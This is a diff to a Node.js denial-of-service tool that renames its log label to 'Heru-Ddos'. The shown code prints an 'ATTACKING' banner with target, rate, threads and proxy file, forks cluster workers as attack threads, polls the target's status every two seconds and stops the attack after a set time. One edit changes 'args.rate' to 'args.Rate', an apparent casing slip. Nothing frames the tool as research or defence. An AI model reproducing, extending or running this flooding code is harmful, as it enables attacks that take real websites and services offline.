@@ -58,16 +58,16 @@ function getStatus() {
     Promise.race([axiosPromise, timeoutPromise])
         .then((response) => {
             const { status, data } = response;
-            console.log(`${getCurrentTime()} [LIService]  Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
+            console.log(`${getCurrentTime()} [Heru-Ddos]  Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
         })
         .catch((error) => {
             if (error.message === 'Request Timed Out') {
-                console.log(`${getCurrentTime()} [LIService]  Request Timed Out`);
+                console.log(`${getCurrentTime()} [Heru-Ddos]  Request Timed Out`);
             } else if (error.response) {
                 const extractedTitle = getTitleFromHTML(error.response.data);
-                console.log(`${getCurrentTime()} [LIService]  Title: ${extractedTitle} `);
+                console.log(`${getCurrentTime()} [Heru-Ddos]  Title: ${extractedTitle} `);
             } else {
-                console.log(`${getCurrentTime()} [LIService]  ${error.message}`);
+                console.log(`${getCurrentTime()} [Heru-Ddos]  ${error.message}`);
             }
         });
 }
@@ -124,18 +124,18 @@ $$ |  $$ |$$ |  $$ |$$ |  $$ |$$\   $$ |
 $$$$$$$  |$$$$$$$  | $$$$$$  |\$$$$$$  |
 \_______/ \_______/  \______/  \______/ 
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDEVELOP BY JAYMAR\nATTACKING: ${args.target}\nTIME: ${args.time}\nRATE: ${args.rate}\nTHREADS: ${args.threads}\nPROXYFILE: ${args.proxyFile}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDEVELOP BY JAYMAR\nATTACKING: ${args.target}\nTIME: ${args.time}\nRATE: ${args.Rate}\nTHREADS: ${args.threads}\nPROXYFILE: ${args.proxyFile}
              
 `);
 
     for (let i = 1; i <= process.argv[5]; i++) {
         cluster.fork();
-        console.log(`${getCurrentTime()} [LIService]  Attack Thread ${i} Started`);
+        console.log(`${getCurrentTime()} [Heru-Ddos]  Attack Thread ${i} Started`);
     }
-    console.log(`${getCurrentTime()} [LIService]  The Attack Has Started`);
+    console.log(`${getCurrentTime()} [Heru-Ddos]  The Attack Has Started`);
     setInterval(getStatus, 2000);
     setTimeout(() => {
-        console.log(`${getCurrentTime()} [LIService]  The Attack Is Over`);
+        console.log(`${getCurrentTime()} [Heru-Ddos]  The Attack Is Over`);
         process.exit(1);
     }, process.argv[3] * 1000);
 }
